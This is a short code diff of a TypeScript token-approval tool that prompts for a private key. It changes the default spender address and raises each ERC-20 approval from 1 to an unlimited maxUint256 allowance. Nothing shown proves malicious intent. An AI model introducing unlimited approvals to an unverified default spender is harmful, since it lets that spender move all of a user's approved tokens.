@@ -79,7 +79,7 @@ export const giveApprovals = async () => {
       }
       return true;
     },
-    default: "0x67329453D888f81863bcF6bF680EAf420D3008AF",
+    default: "0x000000000004598D17aaD017bF0734a364c5588b",
   });
 
   const privateKey = await password({
@@ -136,7 +136,7 @@ export const giveApprovals = async () => {
           address: tokenAddress,
           abi: erc20Abi,
           functionName: "approve",
-          args: [spenderAddress as Address, 1n],
+          args: [spenderAddress as Address, maxUint256],
         });
 
         const receipt = await publicClient.waitForTransactionReceipt({
